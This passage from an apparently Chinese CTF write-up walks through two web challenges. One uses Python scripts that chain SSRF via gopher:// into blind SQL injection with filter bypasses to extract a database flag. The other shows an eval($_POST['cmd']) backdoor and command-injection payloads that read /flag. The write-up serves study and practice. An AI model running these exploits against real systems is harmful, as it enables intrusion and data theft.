class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/10/ROIS/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/10/ROIS/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/10/ROIS/image-20230412130046708.png"></p><p>浏览器发送一次请求，记住python出payload的时候要url编码两次</p><p><img src="/2023/02/10/ROIS/image-20230412130722783.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130832052.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/10/ROIS/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p><hr><h3 id="cachewaf"><a href="#cachewaf" class="headerlink" title="cachewaf"></a>cachewaf</h3><p>一道初见被乱杀的防火墙绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简短的题目，极致的享受（×</p><p>这eval就摆在面前就别怪system直接shell了(</p><p><img src="/2023/02/10/ROIS/image-20230408224620364.png"></p><p>emmm，说是右括号出了点问题，考虑到这道题有防火墙，先排查一下问题出哪了。<img src="/2023/02/10/ROIS/image-20230408223545003.png"></p><p>看起来括号本身应该不是问题，echo也没被过滤，引号也没问题，应该是system被拦截了，继续尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;system&quot;</span>)(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408224700965.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls`;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408223928850.png"></p><p>(“system”)和反引号没被过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls /`;<span class="hljs-comment">#查看根目录下发现存在/flag</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-comment">#尝试读取flag，结果没有回显，看起来flag被过滤了</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /f*`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /fl<span class="hljs-string">&#x27;a&#x27;</span>g`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /f?ag`;<br><span class="hljs-comment">#尝试上述两种绕过均可读取到flag</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408232643615.png"></p><p>但是提交flag时发现是假的flag，果然不可能这么简单啊（悲</p><p>既然这样不妨看一看waf.php查看下防火墙规则吧（waf.php也被过滤了用w*绕过，网页直接读取文件没有分行实在难受，就用bp抓包后发传参了）</p><p><img src="/2023/02/10/ROIS/image-20230408233044629.png"></p><p>waf.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span 